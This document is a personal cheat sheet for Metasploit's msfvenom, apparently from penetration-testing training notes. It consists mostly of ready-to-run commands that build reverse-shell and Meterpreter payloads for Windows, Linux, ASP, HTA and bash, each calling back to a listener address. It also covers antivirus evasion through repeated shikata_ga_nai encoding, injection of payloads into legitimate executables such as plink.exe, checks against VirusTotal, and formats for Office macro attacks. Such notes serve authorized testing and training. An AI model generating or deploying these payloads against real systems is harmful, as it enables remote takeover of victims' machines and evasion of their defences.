## Metasploit Framework Venom

This can be run from Bash or from Metasploit.  In MSF, you can use the `msfvenom` command or the `generate` command from within a payload.

### Creating a Payload

The basic formula for creating a payload with msfvenom is:

1. Choose a payload type (this should match whatever application and OS you are targeting)

   ```bash
   # Show all payloads
   msfvenom -l payloads  # You will probably want to grep this output because it's a LONG list
   ```

2. Specify options for the payload (for instance, a reverse shell requires the IP and Port the target should connect back to)

   ```bash
   # Show all options for a payload
   msfvenom -p YOUR_PAYLOAD --list-options
   
   # NOTE: Some older versions of msfvenom use --payload-options instead
   ```

3. Specify a format to create the payload in

   ```bash
   # Show all output options
   msfvenom -l formats
   ```

4. Specify an output file (without this, it will dump the payload to the screen for some options)

5. (OPTIONAL) You can also encode the payload to avoid antivirus.

   ```bash
   # Show all encoders
   msfvenom -l encoders
   ```

## msfvenom Cheat Sheets

Windows Meterpreter Payload

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.216 LPORT=8000 -f exe -o win_met_revhttp_8001.exe
```

Windows x86 Reverse TCP Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f exe -o win_revtcp_8000.exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=4444 -f c
```

Windows x64 Reverse TCP Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LPORT=8000 LHOST=10.10.14.37 --platform windows -a x64 --format exe -o win_revtcp_8000.exe
```

Windows HTA file (I think the code can be used on a webpage too, maybe, with Internet Explorer)

```bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f hta-psh -o /var/www/html/win_revtcp_8000.hta
```

Linux Meterpreter Payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f elf -o lin_met_revhttp_8001.elf
```

Linux Reverse TCP Payload

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f elf -o lin_met_revhtt_8000.elf
```

Running a payload in BASH (remember to enclose in single quotes)

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.119.216 LPORT=8000 -f raw
```

Microsoft IIS ASP Reverse TCP Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f asp -o reverse_tcp_8000.asp
```

### Help Menus

```bash
# Show the different output formats available
msfvenom -l formats

# Show the different output file formats available
msfvenom -l formats
```

### Script Shellcode

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 EXITFUNC=thread -f python -e x86/shikata_ga_nai -b "\x00\x20" -v shellcode

-v 	# Sets the variable name
-b	# Bad characters to avoid
-e	# Encoder to pass through

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=3000 EXITFUNC=thread -f python -e x86/shikata_ga_nai -b "\x00" -v shellcode
```

### VirusTotal Check

You can check your payloads against Virustotal using msf-virustotal.  This requires creating a free account with Virustotal and generating an API key

```bash
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

### Executable Files

#### Unencoded Executables

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f exe -o shell_reverse.exe

# Options
-p	# Payload
-f	# Format
-o	# Output filename
```

#### Encoded Executables

Encoding is normally used to bypass character limitations but also serves as a rudimentary AV evasion technique.  More encoding iterations can be used to evade signature detection.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse.exe

# Options
-e	# Encoder to use
-i	# Number of encoding iterations
```

x86\shikata_ga_nai is the best

List all encoders:

```bash
msfvenom -l encoders
```

#### Injecting into Existing PE's

Portable executables can have payloads injected into them which may further evade AV.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse.exe

# Options
-x	# Executable to inject payload into
```

Note:  When using Meterpreter injected into PE's, the connection will be tied to the PE that the payload was injected into, and thus once the PE finishes, the session will be closed.  To avoid this, migrate your Meterpreter session to another process with an `AutoRunScript` on the Meterpreter Handler

Note2:  If you run into issues where the session still dies, try upgrading Metasploit or make sure you are not moving through the program too quickly.

### Adding NOPs

If you need to size your shellcode specifically, use the `-n` option to specify a number of NOPs (or NOP equivalents, MSFVenom will use some other characters that do the same thing):

```bash
# Specify 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f py -n 20
```

### Buffer Overflows

See the Fuzzing Windows / Linux pages.

### Web Applications

See the HTML-Applications page

### Client-Side attacks

File formats hta-psh, vba, and vba-psh are for client-side attacks using an Office macro or HTML applications.

### msfvenom Output Formats

```bash
Framework Executable Formats [--format <value>]
===============================================
                            
    Name
    ----
    asp
    aspx      
    aspx-exe
    axis2
    dll   
    elf
    elf-so
    exe 
    exe-only
    exe-service  
    exe-small
    hta-psh
    jar                                                  
    jsp                                                  
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war
    
Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    hex
    java
    js_be
    js_le
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    sh
    vbapplication
    vbscript
```

### Links & Cheat Sheets

https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/

https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/ (might be same stuff as above)

https://netsec.ws/?p=331